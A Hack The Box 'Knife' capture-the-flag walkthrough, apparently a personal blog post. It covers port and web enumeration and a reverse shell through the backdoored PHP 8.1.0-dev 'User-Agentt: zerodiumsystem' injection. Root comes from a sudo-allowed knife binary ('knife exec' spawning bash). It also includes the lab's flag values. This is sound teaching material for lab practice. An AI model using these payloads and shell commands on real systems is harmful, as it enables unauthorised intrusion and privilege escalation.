---
layout: post
title: HTB Knife WriteUp
date: 2024-05-25
categories:
  - HackTheBox
  - HackTheBox-Linux
tags:
  - HackTheBox
  - CTF
  - Linux
  - PHP-8.1.0-dev
  - User-Agentt-Pollution
  - OSCP
  - Knife-Binary
media_subpath: /assets/img/Knife/
---
![Desktop View](Knife.png){: w="800"  h="400" }

# Knife Skills

>Knife is an easy Linux machine where we will use the following skills:

-  **Port Discovery**
-  **Web Tech's Enumeration**
-  **Abusing PHP BackDoored Version**
-  **User-Agent Modification**
-  **Abusing Knife Binary - Sudoers**

---

## IP Address Enumeration

Using the usual Nmap scan I've discovered port **22** & port **80**:

```perl
nmap -p- --open -sS --min-rate 10000 -vvv -n -Pn 10.10.10.242
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-25 01:25 CEST
Initiating SYN Stealth Scan at 01:25
Scanning 10.10.10.242 [65535 ports]
Discovered open port 80/tcp on 10.10.10.242
Discovered open port 22/tcp on 10.10.10.242
```

Then i launched a basic group of scripts to seek more info from the open ports:

```perl
nmap -sCV -p22,80 10.10.10.242 -oN targeted
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-25 01:27 CEST
Nmap scan report for 10.10.10.242
Host is up (0.13s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title:  Emergent Medical Idea
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Beside the **Apache** version and the **SSH** version nothing useful was reported.

---
## Web Enumeration

Before getting into the **website** i like to execute **whatweb** to get more specific info about the technologies running in the background of the web.

```python
whatweb 10.10.10.242
```

I got the next response:

```perl
http://10.10.10.242 [200 OK] Apache[2.4.41],
Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)],
IP[10.10.10.242], PHP[8.1.0-dev], Script, Title[Emergent Medical Idea],
X-Powered-By[PHP/8.1.0-dev]
```

_At first when i was doing this machine, i didn't notice that the **PHP 8.1.0-dev** version was the key of this machine, so i started looking inside the website_ 

Once we enter http://10.10.10.242/ we are in front of the following website:

![Desktop View](knifeMainPage.png)

Unfortunately nothing in the website is functional, also nothing found in the code, and there is no **robots.txt**.

So i started **Fuzzing** directories and PHP files but nothing was found, so my last hope was that there was a available subdomain but for my surprise i got no response.

At this point i was a bit confused, i was asking my self  '___What have i missed in this easy box?___', so i check again the **Nmap** and **WhatWeb** reports and i been struck by the PHP version, it was the version  ***8.1.0***, usually this version is not vulnerable, also it looks quite updated, latest version is ***8.3.7***, so i missed it at first but this is a ***8.1.0-dev*** version,

With a search in Google i found a **exploit** that allow us to get RCE.

-  **Exploit**: [https://github.com/flast101/php-8.1.0-dev-backdoor-rce/blob/main/revshell_php_8.1.0-dev.py](https://github.com/flast101/php-8.1.0-dev-backdoor-rce/blob/main/revshell_php_8.1.0-dev.py)

---
## Abusing PHP 8.1.0-dev

Taking a look at the code of the exploit, it seems that we can inject PHP code on a modified `User-Agent` named `User-Agentt` and also a modified `system` parameter named `zerodiumsystem`, so the final payload looks like this:

```bash
"User-Agentt": "zerodiumsystem('" + payload + "');"
```

After understanding the script, it's time to put it in practice,  the script asks for the next arguments:

-  **Target URL**
-  **Local IP**
-  **Local Port**

So, the final command looks like this:

```python
python3 revshell_php_8.1.0-dev.py http://10.10.10.242/ 10.10.16.5 443
```

Before launching the script, we have to set a listener in the specified port.

```bash
nc -nlvp 443
```

After launching the script, we should get a shell at the listener, and like i said, i received a shell as the user James.

![Desktop View](JamesShell.png)

---
## Shell as Root

### TTY Treatment 

Once we get the reverse shell, let's find a way to scale privileges, but before, we have to get a fully interactive shell, there are multiple ways but i like to do it this way: 

```bash
script /dev/null -c bash
```

Then press *Ctrl+Z* to get the process in background.

Now that you are in your machine execute the next command:

```bash
stty raw -echo;fg
```

Now write `reset xterm` and you should have a better looking shell but you still have to execute a few commands:

```bash
export TERM=xterm
export SHELL=bash
stty rows 45 columns 184
```

Make a `stty size` in your own shell to know the rows and columns.

---
### Abusing Knife Binary - Sudoers

We are logged in as the user **`James`**, checking his home folder, we can see now the user flag:

```bash
james@knife:~$ cat user.txt 
7b1c2140a9c942dbd9a0a9a8bf93c823
james@knife:~$ 
```


At first i checked the Kernel version:

```bash
james@knife:/$ uname -a
Linux knife 5.4.0-80-generic #90-Ubuntu SMP Fri Jul 9 22:49:44 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
james@knife:/$
```

But it looks quite updated, also checked if we are in any unusual groups:

```bash
james@knife:/$ id
uid=1000(james) gid=1000(james) groups=1000(james)
james@knife:/$ 
```

Unfortunately we are not in any group.

Checking if there is any binary configured in the sudores file, i found the following content:

```bash
james@knife:/$ sudo -l
Matching Defaults entries for james on knife:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
```

We can execute `/usr/bin/knife` as the user `root`, checking if the binary is covered by [GTFOBins](https://gtfobins.github.io/gtfobins/knife/), i found that `knife` is able to run **`Ruby`** code, so we can spawn a shell with the following command:

```bash
sudo /usr/bin/knife exec -E 'exec "/bin/bash"'
```

After 2 seconds we will get a shell as **`root`**, so now we can read the `root.txt` inside `/root`:

```bash
root@knife:~# cat root.txt 
54af38f64ed9c194f2f3d061ab6013b8
root@knife:~# 
```

---
## Final Thoughts

The Knife Box it's a pretty simple CTF, good to be your first machine and learn to still checking versions of every Tech's discovered and not ignore them like i made, beside that you won't learn nothing new.

![Desktop View](KnifePwn.png)

---
***Thanks for reading, i'll appreciate that you take a look to my other posts  :)***
